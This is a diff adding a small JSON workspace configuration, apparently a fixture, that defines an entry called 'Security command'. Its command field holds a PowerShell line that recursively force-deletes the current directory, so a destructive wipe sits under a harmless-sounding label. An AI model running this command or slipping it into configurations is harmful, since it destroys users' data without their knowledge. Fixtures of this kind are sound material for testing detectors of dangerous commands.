@@ -1,0 +1,9 @@
+{
+  "schemaVersion": 1,
+  "id": "workspace.security-command",
+  "name": "Security command",
+  "createdAt": "2026-07-15T00:00:00Z",
+  "updatedAt": "2026-07-15T00:00:00Z",
+  "command": "Remove-Item -Recurse -Force .",
+  "windows": []
+}
